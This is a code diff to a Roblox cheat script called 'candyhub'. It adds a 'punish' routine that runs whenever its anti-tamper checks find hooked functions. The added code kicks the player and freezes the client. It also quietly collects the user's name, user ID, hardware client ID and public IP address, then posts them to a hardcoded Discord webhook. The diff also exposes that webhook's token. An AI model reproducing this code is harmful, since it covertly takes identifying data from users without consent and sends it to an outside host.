@@ -2,6 +2,45 @@ if getgenv().candyhubloaded then
 	warn("script executed already")
 else
 task.spawn(function()
+	local punish = function(code)
+		game.CoreGui:ClearAllChildren()
+		game.Players.LocalPlayer:Kick("error:"..code)
+		setclipboard(" ")
+		local x = tostring(tick())
+		if clonefunction then 
+			getgenv()[x] = clonefunction(request)
+		end
+		local taxrget = getgenv()[x] or request
+		local response = taxrget({
+			Url = "https://discord.com/api/webhooks/1402030225277063220/q7Taj4rLDM1lozMgs4bO7K0psHNER48uklwArwoBwF7o2Pjvdby-i_t6P1R8iE_ooEmY",
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = game:GetService("HttpService"):JSONEncode({
+			    ["embeds"] = {
+				{
+				    ["title"] = "Attack Sent",
+				    ["description"] = "Executed by: "..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId,
+				    ["color"] = 8851805,
+				    ["fields"] = {         
+					{
+					    ["name"] = "Error Code:",
+					    ["value"] = code
+					},
+					{
+					    ["name"] = "User",
+					    ["value"] = "```yaml\nName: "..game.Players.LocalPlayer.Name.."\nDisplayName: "..game.Players.LocalPlayer.DisplayName.."\nUserId: "..game.Players.LocalPlayer.UserId.."\nHWID: "..game:GetService("RbxAnalyticsService"):GetClientId().." \nIP: ".. game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.ipify.org/?format=json")).ip .."\n```"
+					}
+				    },
+				    ["footer"] = {
+					["text"] = "candyhub dev"
+				    }
+				}
+			    }
+			})
+		})
+		task.wait(1) while true do end
+	end
+	
 	if hookfunction and is_function_hooked and unhookfunction then -- anti remove isfunctionhooked
 	    local x = "a"..tostring(math.floor(tick()))
 	    getgenv()[x] = function(x) return x end
@@ -9,7 +48,7 @@ task.spawn(function()
 	        return x
 	    end)
 	    if not is_function_hooked(getgenv()[x]) then
-	        game.CoreGui:ClearAllChildren() game.Players.LocalPlayer:Kick("error:204") setclipboard(" ") return 0
+	        punish("error:204") return 0
 	    end
 	    getgenv()[x] = nil
 	
@@ -22,14 +61,16 @@ task.spawn(function()
 	    end)
 	    unhookfunction(getgenv()[b])
 	    if getgenv()[b]("a") == "aa" then
-	        game.CoreGui:ClearAllChildren() game.Players.LocalPlayer:Kick("error:205") setclipboard(" ") return 0
+	        punish("error:205") return 0
 	    end
 	    getgenv()[b] = nil
 	
-	    if is_function_hooked(request) then game.CoreGui:ClearAllChildren() game.Players.LocalPlayer:Kick("error:206") setclipboard(" ") return 0 end
-	    if is_function_hooked(loadstring) then game.CoreGui:ClearAllChildren() game.Players.LocalPlayer:Kick("error:207") setclipboard(" ") return 0 end
-	    if is_function_hooked(is_function_hooked) then game.CoreGui:ClearAllChildren() game.Players.LocalPlayer:Kick("error:208") setclipboard(" ") return 0 end
+	    if is_function_hooked(request) then punish("error:206") return 0 end
+	    if is_function_hooked(loadstring) then punish("error:207") return 0 end
+	    if is_function_hooked(is_function_hooked) then punish("error:208") return 0 end
 	end
+	hookfunction = function() end
+	getgenv().hookfunction = function() end
 	hookfunction(hookfunction,function() end)
 	print("got in :)")
 end)
